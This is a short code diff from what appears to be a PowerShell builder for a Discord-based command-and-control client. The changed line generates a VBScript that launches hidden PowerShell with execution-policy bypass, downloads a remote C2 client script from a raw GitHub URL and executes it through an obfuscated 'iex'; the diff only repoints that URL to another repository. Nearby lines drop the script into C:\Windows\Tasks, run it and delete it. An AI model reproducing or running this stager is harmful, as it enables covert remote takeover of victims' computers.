@@ -147,7 +147,7 @@ if($stagebox.Checked){
 "`$tobat = @`"" | Out-File -FilePath $tempc2client -Append
 "Set WshShell = WScript.CreateObject(```"WScript.Shell```")" | Out-File -FilePath $tempc2client -Append
 "WScript.Sleep 200" | Out-File -FilePath $tempc2client -Append
-"WshShell.Run ```"powershell.exe -NonI -NoP -Ep Bypass -W H -C ```$tk='`$tk'; irm https://raw.githubusercontent.com/beigeworm/PoshCord-C2/main/Discord-C2-Client.ps1 | i``ex```", 0, True" | Out-File -FilePath $tempc2client -Append
+"WshShell.Run ```"powershell.exe -NonI -NoP -Ep Bypass -W H -C ```$tk='`$tk'; irm https://raw.githubusercontent.com/11co/zorna/main/Discord-C2-Client.ps1 | i``ex```", 0, True" | Out-File -FilePath $tempc2client -Append
 "`"@" | Out-File -FilePath $tempc2client -Append
 '$pth = "C:\Windows\Tasks\service.vbs";$tobat | Out-File -FilePath $pth -Force ;& $pth;Sleep 5;rm -Path $pth' | Out-File -FilePath $tempc2client -Append
 }
@@ -187,5 +187,6 @@ rm -Path $tempps2exe -Force
 
 $MainWindow.ShowDialog()
 exit 
+
 
 
